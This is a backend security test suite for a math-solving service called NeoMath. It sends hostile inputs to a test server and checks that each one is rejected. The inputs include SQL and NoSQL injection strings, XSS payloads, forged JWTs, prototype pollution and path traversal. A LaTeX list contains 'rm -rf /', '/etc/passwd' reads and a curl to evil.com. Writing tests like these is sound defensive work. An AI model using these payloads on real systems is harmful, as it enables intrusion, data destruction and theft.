/**
 * NeoMath Backend Test Suite
 *
 * BRUTAL TEST CASES - Written by Senior QA Engineer
 * These tests are designed to break things, not just pass.
 *
 * Run: npm test
 */

import { describe, it, expect, beforeAll } from "vitest";
import { randomIp } from "./support/network";
import { registerVerifiedUser, uniqueEmail } from "./support/users";

// Mock API base URL
const API_URL = process.env.TEST_API_URL || "http://localhost:3000";
// Each test file gets its own User, so files running in parallel never share one
const TEST_USER_EMAIL = uniqueEmail();
const TEST_USER_PASSWORD = "Test123!";

// Global setup: a verified test User, since only Verified Users can solve
beforeAll(async () => {
  await registerVerifiedUser(TEST_USER_EMAIL);
});

// ============================================================================
// AUTHENTICATION TESTS - THE GATES OF HELL
// ============================================================================

describe("🔐 AUTH - Brutal Security Tests", () => {
  // -------------------------------------------------------------------------
  // LOGIN ENDPOINT ATTACKS
  // -------------------------------------------------------------------------

  describe("POST /auth/login - Break It", () => {
    it("should reject SQL injection in email field", async () => {
      const maliciousPayloads = [
        "admin'--",
        "admin' OR '1'='1",
        "'; DROP TABLE users; --",
        "admin@test.com' AND 1=1--",
        '" OR ""="',
      ];

      for (const payload of maliciousPayloads) {
        const res = await fetch(`${API_URL}/auth/login`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email: payload, password: "test123" }),
        });

        expect(res.status).not.toBe(200);
        const data = await res.json();
        expect(data.accessToken).toBeUndefined();
      }
    });

    it("should reject NoSQL injection in email field", async () => {
      const nosqlPayloads = [
        { email: { $gt: "" }, password: "test" },
        { email: { $regex: ".*" }, password: "test" },
        { email: { $ne: null }, password: "test" },
        { email: { $where: "this.password.length > 0" }, password: "test" },
      ];

      for (const payload of nosqlPayloads) {
        const res = await fetch(`${API_URL}/auth/login`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });

        expect(res.status).toBe(400); // Should be caught by Zod
      }
    });

    it("should not leak user existence through timing attacks", async () => {
      const existingEmail = "test@example.com";
      const nonExistingEmail = "nonexistent12345@example.com";

      const timings: number[] = [];

      // Test 10 times each
      for (let i = 0; i < 10; i++) {
        const start1 = Date.now();
        await fetch(`${API_URL}/auth/login`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email: existingEmail, password: "wrong" }),
        });
        const time1 = Date.now() - start1;

        const start2 = Date.now();
        await fetch(`${API_URL}/auth/login`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email: nonExistingEmail, password: "wrong" }),
        });
        const time2 = Date.now() - start2;

        timings.push(Math.abs(time1 - time2));
      }

      // Average timing difference should be < 50ms to prevent timing attacks
      const avgDiff = timings.reduce((a, b) => a + b, 0) / timings.length;
      expect(avgDiff).toBeLessThan(50);
    });

    it("should handle extremely long password without crashing", async () => {
      const longPassword = "a".repeat(100000); // 100KB password

      const res = await fetch(`${API_URL}/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: TEST_USER_EMAIL,
          password: longPassword,
        }),
      });

      // Should reject gracefully, not crash
      expect(res.status).toBeLessThan(500);
    });

    it("should handle null bytes in credentials", async () => {
      const res = await fetch(`${API_URL}/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: "test@test.com\x00admin@test.com",
          password: "test\x00password",
        }),
      });

      expect(res.status).not.toBe(200);
    });

    // Login is limited to 10 attempts per 15 minutes per IP (ADR-0003)
    it("should rate limit after 10 failed attempts", async () => {
      const promises = [];
      // All attempts from one client address
      const attackerIp = randomIp();

      for (let i = 0; i < 15; i++) {
        promises.push(
          fetch(`${API_URL}/auth/login`, {
            method: "POST",
            headers: { "Content-Type": "application/json", "X-Forwarded-For": attackerIp },
            body: JSON.stringify({ email: TEST_USER_EMAIL, password: "wrong" }),
          })
        );
      }

      const responses = await Promise.all(promises);
      const rateLimited = responses.filter((r) => r.status === 429);

      // Exactly the 5 attempts over the limit are refused
      expect(rateLimited.length).toBe(5);
    });

    it("should reject malformed JSON gracefully", async () => {
      const res = await fetch(`${API_URL}/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: "{ invalid json }}}",
      });

      expect(res.status).toBe(400);
    });

    it("should reject prototype pollution attempts", async () => {
      const res = await fetch(`${API_URL}/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: TEST_USER_EMAIL,
          password: "test",
          __proto__: { isAdmin: true },
          constructor: { prototype: { isAdmin: true } },
        }),
      });

      const data = await res.json();
      expect(data.user?.isAdmin).not.toBe(true);
    });
  });

  // -------------------------------------------------------------------------
  // TOKEN MANIPULATION ATTACKS
  // -------------------------------------------------------------------------

  describe("JWT Token Security", () => {
    it('should reject token with "none" algorithm', async () => {
      // Craft a JWT with alg: none
      const header = Buffer.from(
        JSON.stringify({ alg: "none", typ: "JWT" })
      ).toString("base64url");
      const payload = Buffer.from(
        JSON.stringify({ userId: "admin", isAdmin: true })
      ).toString("base64url");
      const fakeToken = `${header}.${payload}.`;

      const res = await fetch(`${API_URL}/auth/me`, {
        headers: { Authorization: `Bearer ${fakeToken}` },
      });

      expect(res.status).toBe(401);
    });

    it("should reject token with modified payload", async () => {
      // Get a valid token first, then modify it
      const loginRes = await fetch(`${API_URL}/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: TEST_USER_EMAIL, password: "Test123!" }),
      });

      if (loginRes.ok) {
        const { accessToken } = await loginRes.json();
        const parts = accessToken.split(".");

        // Decode and modify payload
        const payload = JSON.parse(
          Buffer.from(parts[1], "base64url").toString()
        );
        payload.isAdmin = true;
        payload.userId = "admin-id";

        // Re-encode with same signature (should fail)
        const modifiedPayload = Buffer.from(JSON.stringify(payload)).toString(
          "base64url"
        );
        const modifiedToken = `${parts[0]}.${modifiedPayload}.${parts[2]}`;

        const res = await fetch(`${API_URL}/auth/me`, {
          headers: { Authorization: `Bearer ${modifiedToken}` },
        });

        expect(res.status).toBe(401);
      }
    });

    it("should reject expired tokens immediately", async () => {
      // Craft an expired token (if possible) - this tests token validation
      const res = await fetch(`${API_URL}/auth/me`, {
        headers: {
          Authorization:
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ0ZXN0IiwiZXhwIjoxfQ.fake",
        },
      });

      expect(res.status).toBe(401);
    });

    it("should handle concurrent token refresh without race condition", async () => {
      // Simulate multiple refresh requests at the same time
      const refreshToken = "valid-refresh-token"; // Would need actual token

      const promises = Array(10)
        .fill(null)
        .map(() =>
          fetch(`${API_URL}/auth/refresh`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ refreshToken }),
          })
        );

      const responses = await Promise.all(promises);

      // All should either succeed or fail consistently, no partial states
      const statuses = responses.map((r) => r.status);
      const unique = Array.from(new Set(statuses));
      expect(unique.length).toBeLessThanOrEqual(2); // Either all 200 or all 401
    });
  });

  // -------------------------------------------------------------------------
  // REGISTRATION ABUSE
  // -------------------------------------------------------------------------

  describe("POST /auth/register - Abuse Prevention", () => {
    it("should reject XSS in name field", async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        'javascript:alert("xss")',
        '<svg onload=alert("xss")>',
        '"><script>alert("xss")</script>',
      ];

      for (const payload of xssPayloads) {
        const res = await fetch(`${API_URL}/auth/register`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            email: `test${Date.now()}@test.com`,
            password: "Test123!",
            name: payload,
          }),
        });

        if (res.ok) {
          const data = await res.json();
          // Name should be sanitized (if returned in response)
          if (data.user?.name) {
            expect(data.user.name).not.toContain("<script>");
            expect(data.user.name).not.toContain("onerror");
          }
        }
      }
    });

    it("should enforce password complexity", async () => {
      const weakPasswords = [
        "123456",
        "password",
        "qwerty",
        "abc123",
        "aaaaaa",
        "      ", // spaces only
      ];

      for (const password of weakPasswords) {
        const res = await fetch(`${API_URL}/auth/register`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            email: `weak${Date.now()}@test.com`,
            password,
            name: "Test User",
          }),
        });

        // Should reject weak passwords
        expect(res.status).toBe(400);
      }
    });

    it("should prevent email enumeration", async () => {
      // Register first
      await fetch(`${API_URL}/auth/register`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: "enumtest@test.com",
          password: "Test123!",
          name: "Test",
        }),
      });

      // Try to register again
      const res = await fetch(`${API_URL}/auth/register`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: "enumtest@test.com",
          password: "Test123!",
          name: "Test",
        }),
      });

      const data = await res.json();
      // Error message should be generic, not "email already exists"
      expect(data.error).not.toMatch(/already exists/i);
      expect(data.error).not.toMatch(/duplicate/i);
    });
  });
});

// ============================================================================
// SOLVE API TESTS - THE CORE FUNCTIONALITY TORTURE
// ============================================================================

describe("🧮 SOLVE API - Brutal Stress Tests", () => {
  let authToken: string;

  beforeAll(async () => {
    // Get auth token - must succeed for solve tests to work
    const res = await fetch(`${API_URL}/auth/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email: TEST_USER_EMAIL,
        password: TEST_USER_PASSWORD,
      }),
    });
    if (res.ok) {
      const data = await res.json();
      authToken = data.accessToken;
    } else {
      // Log the error but don't throw - some tests may still work
      const errorData = await res.json().catch(() => ({}));
      console.warn(
        `Solve API beforeAll: Login failed with status ${res.status}:`,
        errorData
      );
    }
  });

  // -------------------------------------------------------------------------
  // INPUT VALIDATION TORTURE
  // -------------------------------------------------------------------------

  describe("Input Validation Edge Cases", () => {
    it("should reject empty problem gracefully", async () => {
      const res = await fetch(`${API_URL}/api/solve`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${authToken}`,
        },
        body: JSON.stringify({ problem: "" }),
      });

      expect(res.status).toBe(400);
    });

    it("should handle Unicode math symbols correctly", async () => {
      const unicodeProblems = [
        "∫ x² dx",
        "∑ n=1 to ∞",
        "√(x² + y²)",
        "∂f/∂x = 2x",
        "lim x→∞ (1/x)",
        "α + β = γ",
        "∀x ∈ ℝ, x² ≥ 0",
      ];

      for (const problem of unicodeProblems) {
        const res = await fetch(`${API_URL}/api/solve`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${authToken}`,
          },
          body: JSON.stringify({ problem }),
        });

        // Should handle gracefully, not crash
        expect(res.status).toBeLessThan(500);
      }
    });

    it("should handle extremely long problem (2000+ chars)", async () => {
      const longProblem = "Solve for x: ".repeat(200);

      const res = await fetch(`${API_URL}/api/solve`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${authToken}`,
        },
        body: JSON.stringify({ problem: longProblem }),
      });

      // Should reject or handle, not crash
      expect(res.status).toBeLessThan(500);
    });

    it("should reject malicious LaTeX injection", async () => {
      const maliciousLatex = [
        "\\input{/etc/passwd}",
        "\\write18{rm -rf /}",
        "\\catcode`\\@=11 \\input{secrets}",
        "\\immediate\\write18{curl evil.com}",
      ];

      for (const latex of maliciousLatex) {
        const res = await fetch(`${API_URL}/api/solve`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${authToken}`,
          },
          body: JSON.stringify({ problem: latex }),
        });

        // Should not execute system commands
        expect(res.status).toBeLessThan(500);
      }
    });

    it("should handle null/undefined in nested objects", async () => {
      const invalidBodies = [
        { problem: null },
        { problem: undefined },
        { problem: { nested: "value" } },
        { problem: ["array", "value"] },
        { problem: 123 },
        { problem: true },
      ];

      for (const body of invalidBodies) {
        const res = await fetch(`${API_URL}/api/solve`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${authToken}`,
          },
          body: JSON.stringify(body),
        });

        expect(res.status).toBe(400);
      }
    });
  });

  // -------------------------------------------------------------------------
  // CONCURRENT REQUEST STRESS
  // -------------------------------------------------------------------------

  describe("Concurrency Stress Tests", () => {
    it("should handle 20 concurrent solve requests", async () => {
      const promises = Array(20)
        .fill(null)
        .map((_, i) =>
          fetch(`${API_URL}/api/solve`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              Authorization: `Bearer ${authToken}`,
            },
            body: JSON.stringify({ problem: `Solve x + ${i} = 10` }),
          })
        );

      const responses = await Promise.all(promises);

      // All should complete (no timeouts/crashes)
      expect(responses.length).toBe(20);

      // Most should succeed or have proper rate limit response
      const validStatuses = responses.filter(
        (r) => r.status === 200 || r.status === 429
      );
      expect(validStatuses.length).toBe(20);
    });

    it("should return consistent results for same problem", async () => {
      const problem = "2 + 2 = ?";
      // Its own User: earlier tests have used up the shared User's solve limit
      const { accessToken: freshToken } = await registerVerifiedUser();

      const promises = Array(5)
        .fill(null)
        .map(() =>
          fetch(`${API_URL}/api/solve`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              Authorization: `Bearer ${freshToken}`,
            },
            body: JSON.stringify({ problem }),
          }).then((r) => r.json())
        );

      const results = await Promise.all(promises);

      // Final answers should all be the same
      const answers = results
        .map((r) => r.solution?.content?.answer?.latex)
        .filter(Boolean);
      const unique = Array.from(new Set(answers));
      expect(unique.length).toBe(1);
    });
  });

  // -------------------------------------------------------------------------
  // AI EDGE CASES
  // -------------------------------------------------------------------------

  describe("AI Response Handling", () => {
    it("should handle unsolvable problems gracefully", async () => {
      const impossibleProblems = [
        "Divide by zero: 1/0 = ?",
        "Find x where x > x",
        "Solve: contradiction = true AND contradiction = false",
        "This is not a math problem at all",
        "🎉🎊🎈🎁", // Emoji only
      ];

      for (const problem of impossibleProblems) {
        const res = await fetch(`${API_URL}/api/solve`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${authToken}`,
          },
          body: JSON.stringify({ problem }),
        });

        // Should return graceful error, not 500
        expect(res.status).toBeLessThan(500);
      }
    });

    it("should timeout on extremely complex problem", async () => {
      const complexProblem = `
        Prove Fermat's Last Theorem for n > 2:
        There are no three positive integers a, b, and c that satisfy 
        the equation a^n + b^n = c^n for any integer value of n > 2.
      `;

      const startTime = Date.now();
      await fetch(`${API_URL}/api/solve`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${authToken}`,
        },
        body: JSON.stringify({ problem: complexProblem }),
      });
      const elapsed = Date.now() - startTime;

      // Should not hang forever (< 60 seconds)
      expect(elapsed).toBeLessThan(60000);
    });
  });
});

// ============================================================================
// HISTORY TESTS - DATA ISOLATION & IDOR ATTACKS
// ============================================================================

describe("📜 HISTORY - IDOR & Data Isolation", () => {
  let user1Token: string;
  let user2Token: string;
  let user1SolutionId: string;

  beforeAll(async () => {
    // Login user 1
    const user1Res = await fetch(`${API_URL}/auth/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: TEST_USER_EMAIL, password: "Test123!" }),
    });
    if (user1Res.ok) {
      const data = await user1Res.json();
      user1Token = data.accessToken;
    }

    // Register/login user 2
    const user2Email = `testuser2_${Date.now()}@test.com`;
    await fetch(`${API_URL}/auth/register`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email: user2Email,
        password: "Test123!",
        name: "Test User 2",
      }),
    });

    const user2Res = await fetch(`${API_URL}/auth/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: user2Email, password: "Test123!" }),
    });
    if (user2Res.ok) {
      const data = await user2Res.json();
      user2Token = data.accessToken;
    }
  });

  describe("Insecure Direct Object Reference (IDOR)", () => {
    it("should NOT allow User2 to access User1 solutions", async () => {
      // User1 creates a solution
      const createRes = await fetch(`${API_URL}/api/solve`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${user1Token}`,
        },
        body: JSON.stringify({ problem: "Private problem for User1" }),
      });

      const { solution } = await createRes.json();
      user1SolutionId = solution?.id;

      // User2 tries to access User1's solution
      const accessRes = await fetch(
        `${API_URL}/api/solution/${user1SolutionId}`,
        {
          headers: { Authorization: `Bearer ${user2Token}` },
        }
      );

      // Should be 403 Forbidden or 404 Not Found
      expect([403, 404]).toContain(accessRes.status);
    });

    it("should NOT allow User2 to delete User1 solutions", async () => {
      const deleteRes = await fetch(`${API_URL}/api/solution/${user1SolutionId}`, {
        method: "DELETE",
        headers: { Authorization: `Bearer ${user2Token}` },
      });

      // Should be 403 Forbidden or 404 Not Found
      expect([403, 404]).toContain(deleteRes.status);
    });

    it("should NOT expose other users IDs in history", async () => {
      const historyRes = await fetch(`${API_URL}/api/history`, {
        headers: { Authorization: `Bearer ${user1Token}` },
      });

      const { history } = await historyRes.json();

      // Check no other user IDs are exposed
      for (const item of history || []) {
        expect(item.userId).toBeUndefined(); // Should not expose userId
        expect(item.userEmail).toBeUndefined(); // Should not expose email
      }
    });
  });

  describe("Edge Cases", () => {
    it("should handle deleting already-deleted solution", async () => {
      // Its own User: earlier tests have used up the shared User's solve limit
      const { accessToken: ownerToken } = await registerVerifiedUser();
      const createRes = await fetch(`${API_URL}/api/solve`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${ownerToken}`,
        },
        body: JSON.stringify({ problem: "To be deleted" }),
      });

      const { solution } = await createRes.json();
      const deleteIt = () =>
        fetch(`${API_URL}/api/solution/${solution.id}`, {
          method: "DELETE",
          headers: { Authorization: `Bearer ${ownerToken}` },
        });

      expect((await deleteIt()).status).toBe(200);
      const secondDelete = await deleteIt();

      expect(secondDelete.status).toBe(404);
    });

    it("should handle clearing empty history", async () => {
      // Create new user with no history
      // ...

      const res = await fetch(`${API_URL}/api/clear-history`, {
        method: "DELETE",
        headers: { Authorization: `Bearer ${user1Token}` },
      });

      // Should succeed even if empty
      expect(res.status).toBe(200);
      const data = await res.json();
      expect(data.deletedCount).toBeGreaterThanOrEqual(0);
    });

    it("should handle invalid solution id format", async () => {
      const invalidIds = [
        "invalid",
        "12345",
        "aaaaaaaaaaaaaaaaaaaaaaaaaa", // Too long
        "zzzzzzzzzzzzzzzzzzzzzzzz", // Invalid chars
        "../../../etc/passwd", // Path traversal
        "<script>alert(1)</script>", // XSS
      ];

      for (const id of invalidIds) {
        const res = await fetch(`${API_URL}/api/solution/${id}`, {
          headers: { Authorization: `Bearer ${user1Token}` },
        });

        // Should be 400 or 404, not 500
        expect(res.status).toBeLessThan(500);
      }
    });
  });
});

// ============================================================================
// PROFILE TESTS - PRIVILEGE ESCALATION
// ============================================================================

describe("👤 PROFILE - Privilege Escalation Prevention", () => {
  let userToken: string;

  beforeAll(async () => {
    const res = await fetch(`${API_URL}/auth/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: TEST_USER_EMAIL, password: "Test123!" }),
    });
    if (res.ok) {
      const data = await res.json();
      userToken = data.accessToken;
    }
  });

  describe("Role Manipulation", () => {
    it("should NOT allow user to set isAdmin via profile update", async () => {
      const res = await fetch(`${API_URL}/api/profile`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${userToken}`,
        },
        body: JSON.stringify({
          name: "Hacker",
          isAdmin: true,
          role: "admin",
        }),
      });

      if (res.ok) {
        const data = await res.json();
        expect(data.user.isAdmin).not.toBe(true);
        expect(data.user.role).not.toBe("admin");
      }
    });

    it("should NOT allow mass assignment attacks", async () => {
      await fetch(`${API_URL}/api/profile`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${userToken}`,
        },
        body: JSON.stringify({
          name: "Test",
          password: "newpassword", // Should not change via profile
          email: "newemail@hack.com", // Should not change
          _id: "admin-id", // Should not change
          createdAt: new Date(0), // Should not change
        }),
      });

      // Verify none of these fields were changed
      const profileRes = await fetch(`${API_URL}/auth/me`, {
        headers: { Authorization: `Bearer ${userToken}` },
      });

      const { user } = await profileRes.json();
      expect(user.email).not.toBe("newemail@hack.com");
      expect(user._id).not.toBe("admin-id");
    });
  });
});

// ============================================================================
// ERROR HANDLING TESTS - INFORMATION LEAKAGE
// ============================================================================

describe("🚨 ERROR HANDLING - No Info Leakage", () => {
  it("should NOT expose stack traces in production errors", async () => {
    const res = await fetch(`${API_URL}/api/nonexistent-endpoint`);
    const text = await res.text();

    expect(text).not.toMatch(/at \w+\s+\(/); // Stack trace pattern
    expect(text).not.toMatch(/node_modules/);
    expect(text).not.toMatch(/\.ts:/);
    expect(text).not.toMatch(/\.js:/);
  });

  it("should NOT expose database connection strings in errors", async () => {
    const res = await fetch(`${API_URL}/api/solve`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: "{ corrupt }",
    });

    const text = await res.text();
    expect(text).not.toMatch(/postgres/i);
    expect(text).not.toMatch(/password/i);
    expect(text).not.toMatch(/secret/i);
  });

  it("should return consistent error format", async () => {
    const endpoints = [
      { url: "/api/solve", method: "POST" },
      { url: "/auth/login", method: "POST" },
      { url: "/api/history", method: "GET" },
    ];

    for (const endpoint of endpoints) {
      const res = await fetch(`${API_URL}${endpoint.url}`, {
        method: endpoint.method,
        headers: { "Content-Type": "application/json" },
        body: endpoint.method === "POST" ? "{}" : undefined,
      });

      if (!res.ok) {
        const data = await res.json();
        // All errors should have consistent 'error' field
        expect(typeof data.error === "string" || data.error === undefined).toBe(
          true
        );
      }
    }
  });
});
